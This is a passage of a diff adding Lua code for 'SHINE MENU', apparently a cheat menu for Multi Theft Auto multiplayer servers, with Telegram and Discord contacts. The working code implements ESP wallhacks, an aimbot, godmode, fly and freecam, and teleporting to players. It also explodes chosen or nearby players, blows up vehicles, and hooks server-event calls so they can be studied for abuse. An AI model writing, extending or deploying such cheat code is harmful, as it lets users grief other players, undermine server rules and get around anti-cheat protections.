+	local camTargetX = camPosX + freeModeAngleX * 100
+	local camTargetY = camPosY + freeModeAngleY * 100
+	local camTargetZ = camPosZ + freeModeAngleZ * 100
+	local mspeed = options.normalMaxSpeed
+	if getKeyState ( options.key_fastMove ) then
+		mspeed = options.fastMaxSpeed
+	elseif getKeyState ( options.key_slowMove ) then
+		mspeed = options.slowMaxSpeed
+	end
+	
+	if options.smoothMovement then
+		local acceleration = options.acceleration
+		local decceleration = options.decceleration
+		local speedKeyPressed = false
+		if getKeyState ( options.key_forward ) then
+			speed = speed + acceleration 
+			speedKeyPressed = true
+		end
+		if getKeyState ( options.key_backward ) then
+			speed = speed - acceleration 
+			speedKeyPressed = true
+		end
+		local strafeSpeedKeyPressed = false
+		if getKeyState ( options.key_right ) then
+			if strafespeed > 0 then
+				strafespeed = 0
+			end
+			strafespeed = strafespeed - acceleration / 2
+			strafeSpeedKeyPressed = true
+		end
+		if getKeyState ( options.key_left ) then
+			if strafespeed < 0 then
+				strafespeed = 0
+			end
+			strafespeed = strafespeed + acceleration / 2
+			strafeSpeedKeyPressed = true
+		end
+		if speedKeyPressed ~= true then
+			if speed > 0 then
+				speed = speed - decceleration
+			elseif speed < 0 then
+				speed = speed + decceleration
+			end
+		end
+		if strafeSpeedKeyPressed ~= true then
+			if strafespeed > 0 then
+				strafespeed = strafespeed - decceleration
+			elseif strafespeed < 0 then
+				strafespeed = strafespeed + decceleration
+			end
+		end
+		if speed > -decceleration and speed < decceleration then
+			speed = 0
+		elseif speed > mspeed then
+			speed = mspeed
+		elseif speed < -mspeed then
+			speed = -mspeed
+		end
+		if strafespeed > -(acceleration / 2) and strafespeed < (acceleration / 2) then
+			strafespeed = 0
+		elseif strafespeed > mspeed then
+			strafespeed = mspeed
+		elseif strafespeed < -mspeed then
+			strafespeed = -mspeed
+		end
+	else
+		speed = 0
+		strafespeed = 0
+		if getKeyState ( options.key_forward ) then speed = mspeed end
+		if getKeyState ( options.key_backward ) then speed = -mspeed end
+		if getKeyState ( options.key_left ) then strafespeed = mspeed end
+		if getKeyState ( options.key_right ) then strafespeed = -mspeed end
+	end
+	local camAngleX = camPosX - camTargetX
+	local camAngleY = camPosY - camTargetY
+	local camAngleZ = 0
+	local angleLength = math.sqrt(camAngleX*camAngleX+camAngleY*camAngleY+camAngleZ*camAngleZ)
+	local camNormalizedAngleX = camAngleX / angleLength
+	local camNormalizedAngleY = camAngleY / angleLength
+	local camNormalizedAngleZ = 0
+	local normalAngleX = 0
+	local normalAngleY = 0
+	local normalAngleZ = 1
+	local normalX = (camNormalizedAngleY * normalAngleZ - camNormalizedAngleZ * normalAngleY)
+	local normalY = (camNormalizedAngleZ * normalAngleX - camNormalizedAngleX * normalAngleZ)
+	local normalZ = (camNormalizedAngleX * normalAngleY - camNormalizedAngleY * normalAngleX)
+	camPosX = camPosX + freeModeAngleX * speed
+	camPosY = camPosY + freeModeAngleY * speed
+	camPosZ = camPosZ + freeModeAngleZ * speed
+	camPosX = camPosX + normalX * strafespeed
+	camPosY = camPosY + normalY * strafespeed
+	camPosZ = camPosZ + normalZ * strafespeed
+	velocityX = (freeModeAngleX * speed) + (normalX * strafespeed)
+	velocityY = (freeModeAngleY * speed) + (normalY * strafespeed)
+	velocityZ = (freeModeAngleZ * speed) + (normalZ * strafespeed)
+	camTargetX = camPosX + freeModeAngleX * 100
+	camTargetY = camPosY + freeModeAngleY * 100
+	camTargetZ = camPosZ + freeModeAngleZ * 100
+	setCameraMatrix ( camPosX, camPosY, camPosZ, camTargetX, camTargetY, camTargetZ )
+end
+
+local function freecamMouse (cX,cY,aX,aY)
+	if isCursorShowing() or isMTAWindowActive() then
+		mouseFrameDelay = 5
+		return
+	elseif mouseFrameDelay > 0 then
+		mouseFrameDelay = mouseFrameDelay - 1
+		return
+	end
+	local width, height = guiGetScreenSize()
+	aX = aX - width / 2 
+	aY = aY - height / 2
+	if options.invertMouseLook then
+		aY = -aY
+	end
+	rotX = rotX + aX * options.mouseSensitivity * 0.01745
+	rotY = rotY - aY * options.mouseSensitivity * 0.01745
+	
+	local PI = math.pi
+	if rotX > PI then
+		rotX = rotX - 2 * PI
+	elseif rotX < -PI then
+		rotX = rotX + 2 * PI
+	end
+	
+	if rotY > PI then
+		rotY = rotY - 2 * PI
+	elseif rotY < -PI then
+		rotY = rotY + 2 * PI
+	end
+	if rotY < -PI / 2.05 then
+	   rotY = -PI / 2.05
+	elseif rotY > PI / 2.05 then
+		rotY = PI / 2.05
+	end
+end
+
+function setFreecamEnabled (x, y, z)
+	if (x and y and z) then
+		setCameraMatrix ( camPosX, camPosY, camPosZ )
+	end
+    toggleAllControls(false)
+	addEventHandler("onClientRender", rootElement, freecamFrame)
+	addEventHandler("onClientCursorMove",rootElement, freecamMouse)
+	
+	return true
+end
+
+function setFreecamDisabled(dontChangeFixedMode)
+	if removeEventHandler("onClientRender", rootElement, freecamFrame) then
+		velocityX,velocityY,velocityZ = 0,0,0
+		speed = 0
+		strafespeed = 0
+        SetX,SetY,SetZ = getCameraMatrix()
+        if isPedInVehicle(localPlayer) then
+            setElementPosition ( getPedOccupiedVehicle(localPlayer), SetX, SetY, SetZ )
+        else
+            setElementPosition ( localPlayer, SetX, SetY, SetZ )
+        end
+		removeEventHandler("onClientCursorMove",rootElement, freecamMouse)
+        toggleAllControls(true)
+		if not dontChangeFixedMode then
+			setCameraTarget( localPlayer )
+		end
+		
+		return true
+	end
+	return false
+end
+
+function toggleFreecam()
+    if isFreecamEnabled then
+        setFreecamDisabled()
+    else
+        setFreecamEnabled()
+    end
+    isFreecamEnabled = not isFreecamEnabled
+end
+
+function toggleGodmode()
+    cancelEvent()
+    setPedArmor(localPlayer,1)
+end
+
+function refreshInformation()
+    guiSetText(ShineInfo,"SHINE MENU - Version 1.3 | Telegram: @ABUSERMTA - Discord: https://discord.gg/DfnHaDSX\n\nOnline Players: "..#getElementsByType("player").." | Interior: "..getElementInterior(localPlayer).." | Dimension: "..getElementDimension(localPlayer))
+end
+refreshInformation()
+
+function refreshPlayersList()
+    guiGridListClear(PlayersGrid)
+    for Index, Player in pairs(getElementsByType("player")) do
+        local gridID = guiGridListAddRow(PlayersGrid)
+        local R,G,B = getPlayerNametagColor(Player)
+        guiGridListSetItemText(PlayersGrid,gridID,1,getPlayerName(Player), false, false)
+        guiGridListSetItemColor(PlayersGrid,gridID,1,R,G,B)
+    end
+end
+refreshPlayersList()
+
+addEventHandler("onClientPlayerJoin",root,function()
+    refreshPlayersList()
+    refreshInformation()
+end)
+
+addEventHandler("onClientPlayerQuit",root,function()
+    refreshPlayersList()
+    refreshInformation()
+end)
+
+addEventHandler ("onClientElementDimensionChange",localPlayer,function()
+    refreshInformation()
+end)
+
+addEventHandler ("onClientElementInteriorChange",localPlayer,function()
+    refreshInformation()
+end)
+
+function guiGridListGetSelectedItemText(gridList,column)
+    local item = guiGridListGetSelectedItem(gridList)
+    if item then
+        return guiGridListGetItemText(gridList,item,column or 1)
+    end
+    return false
+end
+
+function isVehicleEmpty(vehicle)
+	if not isElement(vehicle) or getElementType(vehicle) ~= "vehicle" then
+		return true
+	end
+	return not (next(getVehicleOccupants(vehicle)) and true or false)
+end
+
+function toggleBombClick(button, state, _, _, x, y, z)
+    if not guiGetVisible(ShineBG) then
+        if (button == "left" and state == "down") then
+            createProjectile(localPlayer, 21, x, y, z + 0.1)
+        end
+    end
+end
+
+function toggleTeleportClick(button, state, _, _, x, y, z)
+    if not guiGetVisible(ShineBG) then
+        if (button == "left" and state == "down") then
+			setElementPosition(localPlayer,x,y,z+1)
+        end
+    end
+end
+
+addDebugHook("preFunction", function(sourceResource, functionName, isAllowedByACL, luaFilename, luaLineNumber, ...)
+    if isTriggerLoggerEnabled then
+        local args = {...}
+		local ResourceName = sourceResource and getResourceName(sourceResource)
+        outputChatBox("#FF0000[SHINE-DEBUG]:#FFFFFF "..ResourceName.." | "..functionName.." | "..inspect(args).."",255,255,255,true)
+    end
+end, {"triggerServerEvent","triggerLatentServerEvent"})
+
+EspDistance = 200
+guiScrollBarSetScrollPosition(EspDistanceScroll,(EspDistance*100)/5000)
+guiSetText(EspDistanceLabel,"Current Esp Distance Limit: " .. math.floor(EspDistance) .. " M")
+addEventHandler("onClientGUIScroll",EspDistanceScroll,function()
+	EspDistance = (guiScrollBarGetScrollPosition(EspDistanceScroll)/100)* 5000
+	guiSetText(EspDistanceLabel,"Current Esp Distance Limit: " .. math.floor(EspDistance) .. " M")
+end,false)
+
+boneRelations = {
+    [8] = {
+        [4] = {
+            [22] = {
+                [23] = {
+                    [24] = false,
+                },
+            },
+            [32] = {
+                [33] = {
+                    [34] = false,
+                },
+            },
+            [3] = {
+                [2] = {
+                    [1] = {
+                        [51] = {
+                            [52] = {
+                                [53] = {
+                                    [54] = false,
+                                },
+                            },
+                        },
+                        [41] = {
+                            [42] = {
+                                [43] = {
+                                    [44] = false,
+                                },
+                            },
+                        },
+                    },
+                },
+            },
+        },
+    },
+}
+
+function drawSkeleton()
+	for Index,NearPlayers in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"player")) do
+		if not guiCheckBoxGetSelected(Esp.Tik[1]) and NearPlayers == localPlayer then break end
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearPlayers)),0.02)
+        if (scx and scy) then
+            for boneId, boneRelation in pairs(boneRelations) do
+                drawBones(NearPlayers,boneId,boneRelation)
+            end
+        end
+	end
+end
+
+function drawBones(player, _boneId, _boneRelation)
+    if (not (player and _boneId and _boneRelation)) then
+        return
+    end
+
+    local rootX, rootY, rootZ = getPedBonePosition(player, _boneId)
+
+    for boneId, boneRelation in pairs(_boneRelation) do
+        local boneX, boneY, boneZ = getPedBonePosition(player, boneId)
+        dxDrawLine3D(rootX, rootY, rootZ, boneX, boneY, boneZ, tocolor(255,0,0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(player)))/ 150) * 30, true)
+        if (boneRelation) then
+            drawBones(player, boneId, boneRelation)
+        end
+    end
+end
+
+function drawBox()
+	for Index,NearPlayers in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"player")) do
+		if not guiCheckBoxGetSelected(Esp.Tik[1]) and NearPlayers == localPlayer then break end
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearPlayers)),0.02)
+        if (scx and scy) then
+			local minx, miny, minz, mx, my, mz = getElementBoundingBox(NearPlayers) 
+			local x, y, z = getElementPosition(NearPlayers) 
+			dxDrawLine3D(minx+x, miny+y, mz+z, minx+x, my+y ,mz+z, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true) 
+			dxDrawLine3D(minx+x, miny+y, mz+z, mx+x, miny+y ,mz+z, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true) 
+			dxDrawLine3D(mx+x, my+y, mz+z, minx+x, my+y ,mz+z, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true) 
+			dxDrawLine3D(mx+x, miny+y, mz+z, mx+x, my+y ,mz+z, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true) 
+	
+			dxDrawLine3D(minx+x, miny+y, mz+z-1.9, minx+x, my+y ,mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true) 
+			dxDrawLine3D(minx+x, miny+y, mz+z-1.9, mx+x, miny+y ,mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true) 
+			dxDrawLine3D(mx+x, my+y, mz+z-1.9, minx+x, my+y ,mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true) 
+			dxDrawLine3D(mx+x, miny+y, mz+z-1.9, mx+x, my+y ,mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true)
+	
+			dxDrawLine3D(minx+x, miny+y, mz+z, minx+x, miny+y, mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true)
+			dxDrawLine3D(mx+x, my+y, mz+z, mx+x, my+y, mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true)
+			dxDrawLine3D(minx+x, my+y ,mz+z, minx+x, my+y ,mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true)
+			dxDrawLine3D(mx+x, miny+y ,mz+z, mx+x, miny+y ,mz+z-1.9, tocolor(255, 0, 0), (getDistanceBetweenPoints3D(Vector3(getCameraMatrix()),Vector3(getElementPosition(NearPlayers)))/ 150) * 30, true)
+		end
+	end
+end
+
+function drawLine()
+	for Index,NearPlayers in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"player")) do
+		if not guiCheckBoxGetSelected(Esp.Tik[1]) and NearPlayers == localPlayer then break end
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearPlayers)),0.02)
+        if (scx and scy) then
+			dxDrawLine3D(Vector3(getElementPosition(localPlayer)),Vector3(getElementPosition(NearPlayers)),tocolor(255,0,0),1,true)
+		end
+	end
+end
+
+function dxDrawTextOnElement(TheElement, text, height, R, G, B, alpha, font,Pos, ...)
+	local x, y, z = getElementPosition (TheElement)
+	local x2, y2, z2 = getCameraMatrix()
+	local height = height or 1
+	local sx, sy = getScreenFromWorldPosition(x, y, z+height)
+	if(sx) and (sy) then
+		dxDrawText(text, sx+2, sy-Pos, sx, sy, tocolor(R or 255, G or 255, B or 255, alpha or 255),interpolateBetween(1.3, 0, 0, 0.1, 0, 0, (getDistanceBetweenPoints3D(Vector3(getElementPosition(localPlayer)),Vector3(getElementPosition(TheElement)))/150), "Linear"), font or "arial", "center", "center", false, false, true, true, false)
+	end
+end
+
+function drawName()
+	for Index,NearPlayers in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"player")) do
+		if not guiCheckBoxGetSelected(Esp.Tik[1]) and NearPlayers == localPlayer then break end
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearPlayers)),0.02)
+        if (scx and scy) then
+			dxDrawTextOnElement(NearPlayers,getPlayerName(NearPlayers),1,255,0,0,255,"default-bold",100)
+		end
+	end
+end
+
+function drawDistance()
+	for Index,NearPlayers in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"player")) do
+		if not guiCheckBoxGetSelected(Esp.Tik[1]) and NearPlayers == localPlayer then break end
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearPlayers)),0.02)
+        if (scx and scy) then
+			dxDrawTextOnElement(NearPlayers,math.floor(getDistanceBetweenPoints3D(Vector3(getElementPosition(localPlayer)),Vector3(getElementPosition(NearPlayers)))).." M",1,255,0,0,255,"default-bold",50)
+		end
+	end
+end
+
+function drawLineVehicle()
+	for Index,NearVehicles in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"vehicle")) do
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearVehicles)),0.02)
+        if (scx and scy) then
+			dxDrawLine3D(Vector3(getElementPosition(localPlayer)),Vector3(getElementPosition(NearVehicles)),tocolor(255,0,0),1,true)
+		end
+	end
+end
+
+function drawNameVehicle()
+	for Index,NearVehicles in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"vehicle")) do
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearVehicles)),0.02)
+        if (scx and scy) then
+			dxDrawTextOnElement(NearVehicles,getVehicleNameFromModel(getElementModel(NearVehicles)),1,255,0,0,255,"default-bold",0)
+		end
+	end
+end
+
+function drawDistanceVehicle()
+	for Index,NearVehicles in pairs(getElementsWithinRange(Vector3(getCameraMatrix()),EspDistance,"vehicle")) do
+		local scx, scy = getScreenFromWorldPosition(Vector3(getElementPosition(NearVehicles)),0.02)
+        if (scx and scy) then
+			dxDrawTextOnElement(NearVehicles,math.floor(getDistanceBetweenPoints3D(Vector3(getElementPosition(localPlayer)),Vector3(getElementPosition(NearVehicles)))).." M",1,255,0,0,255,"default-bold",-50)
+		end
+	end
+end
+
+function isPedAiming (thePedToCheck)
+	if isElement(thePedToCheck) then
+		if getElementType(thePedToCheck) == "player" or getElementType(thePedToCheck) == "ped" then
+			if getPedTask(thePedToCheck, "secondary", 0) == "TASK_SIMPLE_USE_GUN" or isPedDoingGangDriveby(thePedToCheck) then
+				return true
+			end
+		end
+	end
+	return false
+end
+
+local sx, sy = guiGetScreenSize()
+
+local bodyParts = {
+	[2] = {
+		{
+			distance = 200,
+			multiple = Vector3(0.03, 0.03, 0.05),
+		},
+		default = Vector3(0.03, 0.03, 0.05),
+	},
+	[8] = {
+		{
+			distance = 200,
+			multiple = Vector3(0.03, 0.03, 0.05)
+		},
+		{
+			distance = 100,
+			multiple = Vector3(0.03, 0.03, 0.0525)
+		},
+		{
+			distance = 50,
+			multiple = Vector3(0.03, 0.03, 0.05)
+		},
+		default = Vector3(0.03, 0.03, 0.05),
+	},
+	
+}
+
+function calculateDepthBuffer(bp, dist)
+	if not bodyParts[bp] then return end
+	local foundIndex = 'default'
+	local najmniejszaRoznica = 9999
+	for i, v in pairs(bodyParts[bp]) do
+		if v.distance then
+			local calc = math.abs(v.distance - dist)
+			if calc < najmniejszaRoznica then
+				najmniejszaRoznica = calc
+				foundIndex = i
+			end
+		end
+	end
+	return bodyParts[bp][foundIndex].multiple or bodyParts[bp][foundIndex]
+end
+
+
+
+local selectedBodyPart = 8
+
+
+
+function findRotation( x1, y1, x2, y2 ) 
+    local t = -math.deg( math.atan2( x2 - x1, y2 - y1 ) )
+    return t < 0 and t + 360 or t
+end
+
+function getPlayersOnScreen()
+	local players = getElementsByType("player", root, true)
+	local t = {}
+	for i = 1, #players do
+		if players[i] ~= localPlayer then
+			t[#t + 1] = players[i]
+		end
+	end
+	return t
+end
+
+local function sortbyrot(a, b) 
+    local _, _, rz = getElementRotation(localPlayer) 
+    local x, y = getElementPosition(localPlayer) 
+    local ax, ay = getElementPosition(a) 
+    local bx, by = getElementPosition(b) 
+    local arz = findRotation(x, y, ax, ay) 
+    arz = math.abs(rz - arz) 
+    local brz = findRotation(x, y, bx, by) 
+    brz = math.abs(rz - brz) 
+    return arz < brz 
+end 
+
+
+local aspectScaling = 1
+function scaleAspectRatio()
+	local aspect = dxGetStatus()['SettingAspectRatio']
+	if aspect == "4:3" then
+		aspectScaling = 1.4
+	end
+end
+scaleAspectRatio()
+
+addEventHandler("onClientPreRender", root, function()
+	if not isPedAiming(localPlayer) or not isTrashAimbotEnabled then return end
+
+	local players = getPlayersOnScreen()
+	if not players[1] then return end
+	table.sort(players, sortbyrot)
+
+	local ped = players[1]
+	local target = Vector3(getPedTargetEnd(localPlayer))
+	local startTarget = Vector3(getPedTargetStart(localPlayer))
+
+
+	local pedPos = Vector3(getElementPosition(ped))	
+
+	local screenPos = Vector2(getScreenFromWorldPosition(getPedBonePosition(ped, selectedBodyPart)))
+
+	local _, _, rzL = getElementRotation(localPlayer)
+
+	local px, py = getElementPosition(localPlayer)
+
+	local rot = math.rad(rzL)
+
+	local depthBuffer = getDistanceBetweenPoints3D(target.x, target.y, target.z, startTarget)
+
+	local newPos = screenPos
+	local calc = depthBuffer
+
+	local distance = getDistanceBetweenPoints3D(startTarget.x, startTarget.y, startTarget.z, pedPos)
+
+	local multipler = calculateDepthBuffer(selectedBodyPart, distance)
+
+	local calcX = math.cos(rot) * (depthBuffer * multipler.x)
+	local calcY = math.sin(rot) * (depthBuffer * multipler.y)
+	
+	local calZ = calc * (multipler.z * aspectScaling)
+
+	local worldPos = Vector3( getWorldFromScreenPosition(newPos.x, newPos.y, depthBuffer) ) - Vector3(calcX, calcY, calZ)
+
+	setCameraTarget(worldPos)
+end)
+
+function changeKeybind(button,press)
+    if InKeybindMode then
+        if (press) then
+            if button ~= "mouse1" then
+                InKeybindMode = false
+                unbindKey(tostring(guiGetText(Keybind)),"down",toggleShine)
+                guiSetAlpha(Keybind,1.0)
+                guiSetText(Keybind,tostring(button))
+                bindKey(tostring(guiGetText(Keybind)),"down",toggleShine)
+				addNotification("Keybind Has Been Changed Successfully.",{255,0,0})
+            end
+        end
+    end
+end
+addEventHandler("onClientKey",root,changeKeybind)
+
+addEventHandler("onClientGUIClick",getRootElement(),function()
+    if source == ShineMenu.button[4] then
+        if isEventHandlerAdded("onClientRender",root,fastSprint) then
+            removeEventHandler("onClientRender",root,fastSprint)
+        else
+            addEventHandler("onClientRender",root,fastSprint)
+        end
+        addNotification("Fast Sprint Has Been "..(isEventHandlerAdded("onClientRender",root,fastSprint) and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+    elseif source == ShineMenu.button[10] then
+		if isEventHandlerAdded("onClientRender",root,fastReload) then
+            removeEventHandler("onClientRender",root,fastReload)
+        else
+            addEventHandler("onClientRender",root,fastReload)
+        end
+        addNotification("Fast Reload Has Been "..(isEventHandlerAdded("onClientRender",root,fastReload) and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+    elseif source == ShineMenu.button[2] then
+        setElementHealth(localPlayer,0)
+    elseif source == ShineMenu.button[11] then
+        setElementHealth(localPlayer,100)
+    elseif source == ShineMenu.button[7] then 
+        if isPedInVehicle(localPlayer) and getPedOccupiedVehicleSeat(localPlayer) == 0 then
+            setVehicleEngineState(getPedOccupiedVehicle(localPlayer),true)
+        else
+            addNotification("You Must Be Driver To Start Vehicle Engine.",{255,0,0})
+        end
+    elseif source == ShineMenu.button[12] then
+        if isPedInVehicle(localPlayer) and getPedOccupiedVehicleSeat(localPlayer) == 0 then
+            fixVehicle(getPedOccupiedVehicle(localPlayer))
+        else
+            addNotification("You Must Be Driver To Repair Vehicle.",{255,0,0})
+        end
+    elseif source == ShineMenu.button[5] then
+        if isEventHandlerAdded("onClientPreRender",root,toggleFly) then
+            removeEventHandler("onClientPreRender",root,toggleFly)
+        else
+            addEventHandler("onClientPreRender",root,toggleFly)
+        end
+        addNotification("Fly Has Been "..(isEventHandlerAdded("onClientPreRender",root,toggleFly) and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+        setElementFrozen(localPlayer,(isEventHandlerAdded("onClientPreRender",root,toggleFly)))
+        setElementCollisionsEnabled(localPlayer,not (isEventHandlerAdded("onClientPreRender",root,toggleFly)))
+    elseif source == ShineMenu.button[13] then
+        setWorldSpecialPropertyEnabled("aircars",not isWorldSpecialPropertyEnabled("aircars"))
+        addNotification("Vehicle Fly Has Been "..(isWorldSpecialPropertyEnabled("aircars") and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+    elseif source == ShineMenu.button[1] then
+        setElementHealth(localPlayer,100)
+        setCameraTarget(localPlayer)
+        if isElementFrozen(localPlayer) then
+            setElementFrozen(localPlayer,false)
+        end
+        toggleAllControls(true)
+        setGameSpeed(1)
+        addNotification("You Have Successfully Revived.",{255,0,0})
+    elseif source == ShineMenu.button[8] then
+        setElementFrozen(localPlayer,not isElementFrozen(localPlayer))
+        toggleAllControls(not isElementFrozen(localPlayer))
+        addNotification("You Are "..(isElementFrozen(localPlayer) and "Frozen" or "Not Frozen").." Now.",{255,0,0})
+    elseif source == ShineMenu.button[6] then
+        toggleFreecam()
+        addNotification("Freecam Has Been "..(isFreecamEnabled and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+    elseif source == ShineMenu.button[3] then
+        if getPedArmor(localPlayer) >= 1 then
+            setPedArmor(localPlayer,0)
+        else
+            setPedArmor(localPlayer,100)
+        end
+        addNotification("Your Armor Has Been Changed To "..math.floor(getPedArmor(localPlayer)).."% Successfully.",{255,0,0})
+    elseif source == ShineMenu.button[9] then
+        if isEventHandlerAdded("onClientPlayerDamage",localPlayer,toggleGodmode) then
+            removeEventHandler("onClientPlayerDamage",localPlayer,toggleGodmode)
+        else
+            addEventHandler("onClientPlayerDamage",localPlayer,toggleGodmode)
+        end
+        addNotification("Godmode Has Been "..(isEventHandlerAdded("onClientPlayerDamage",localPlayer,toggleGodmode) and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+    elseif source == ShineMenu.button[16] then
+        if guiGridListGetSelectedItem(PlayersGrid) >= 0 then
+            if isElement(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid))) then
+				if isPedInVehicle(localPlayer) then
+					if getPedOccupiedVehicleSeat(localPlayer) == 0 then
+						setElementPosition(getPedOccupiedVehicle(localPlayer),Vector3(getElementPosition(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid)))))
+						setElementInterior(getPedOccupiedVehicle(localPlayer),getElementInterior(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid))))
+						setElementDimension(getPedOccupiedVehicle(localPlayer),getElementDimension(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid))))
+						addNotification("You Teleported To "..guiGridListGetSelectedItemText(PlayersGrid)..".",{255,0,0})
+					else
+						addNotification("You Must Be Driver To Teleport With Vehicle.",{255,0,0})
+					end
+				else
+					setElementPosition(localPlayer,Vector3(getElementPosition(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid)))))
+					setElementInterior(localPlayer,getElementInterior(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid))))
+					setElementDimension(localPlayer,getElementDimension(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid))))
+					addNotification("You Teleported To "..guiGridListGetSelectedItemText(PlayersGrid)..".",{255,0,0})
+				end
+            else
+                refreshPlayersList()
+            end
+        else
+            addNotification("Please Select A Player.",{255,0,0})
+        end
+    elseif source == ShineMenu.button[14] then
+        if guiGridListGetSelectedItem(PlayersGrid) >= 0 then
+            if isElement(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid))) then
+                setCameraTarget(localPlayer,getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid)))
+                addNotification("You Are Watching "..guiGridListGetSelectedItemText(PlayersGrid)..".",{255,0,0})
+            else
+                refreshPlayersList()
+            end
+        else
+            addNotification("Please Select A Player.",{255,0,0})
+        end
+    elseif source == ShineMenu.button[15] then
+        if guiGridListGetSelectedItem(PlayersGrid) >= 0 then
+            if isElement(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid))) then
+                createProjectile(localPlayer,20,Vector3(getElementPosition(getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid)))),nil,getPlayerFromName(guiGridListGetSelectedItemText(PlayersGrid)))
+                addNotification(guiGridListGetSelectedItemText(PlayersGrid).." Has Been Exploded Successfully.",{255,0,0})
+            else
+                refreshPlayersList()
+            end
+        else
+            addNotification("Please Select A Player.",{255,0,0})
+        end
+	elseif source == ShineMenu.button[17] then
+		for Index,NearPlayers in pairs(getElementsWithinRange(Vector3(getElementPosition(localPlayer)),150,"player")) do
+            if NearPlayers ~= localPlayer then
+				createProjectile(localPlayer,20,Vector3(getElementPosition(NearPlayers)),nil,NearPlayers)
+            end
+        end
+		addNotification("All Near Players Has Been Exploded Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[18] then
+		for Index,NearVehicles in pairs(getElementsWithinRange(Vector3(getElementPosition(localPlayer)),5000,"vehicle")) do
+			if isElement(NearVehicles) and isVehicleEmpty(NearVehicles) then
+				setElementPosition(NearVehicles,Vector3(getElementPosition(localPlayer)))
+			end
+		end
+		addNotification("All Near Vehicles Has Been Teleported Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[19] then
+		if isEventHandlerAdded("onClientClick",root,toggleBombClick) then
+            removeEventHandler("onClientClick",root,toggleBombClick)
+        else
+            addEventHandler("onClientClick",root,toggleBombClick)
+        end
+        addNotification("Bomb Click Has Been "..(isEventHandlerAdded("onClientClick",root,toggleBombClick) and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[20] then
+		for Index,NearVehicles in pairs(getElementsWithinRange(Vector3(getElementPosition(localPlayer)),200,"vehicle")) do
+			if isElement(NearVehicles) and isVehicleEmpty(NearVehicles) then
+				blowVehicle(NearVehicles)
+			end
+		end
+		addNotification("All Near Vehicles Has Been Exploded Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[21] then
+		if isEventHandlerAdded("onClientClick",root,toggleTeleportClick) then
+            removeEventHandler("onClientClick",root,toggleTeleportClick)
+        else
+            addEventHandler("onClientClick",root,toggleTeleportClick)
+        end
+        addNotification("Teleport Click Has Been "..(isEventHandlerAdded("onClientClick",root,toggleTeleportClick) and "Enabled" or "Disabled").." Successfully.",{255,0,0})
+	elseif source == ShineMenu.button[22] then
+		setPedOnFire(localPlayer,true)
+	elseif source == ShineMenu.button[23] then
+		if isTimer(PositionTrollTimer) then
+			killTimer(PositionTrollTimer)
+			setElementPosition(localPlayer,PosTrollX,PosTrollY,PosTrollZ)
+		else
+			PosTrollX,PosTrollY,PosTrollZ = getElementPosition(localPlayer)
+			PositionTrollTimer = setTimer(function()
+				local RandomPosition = math.random(-1.90,10)
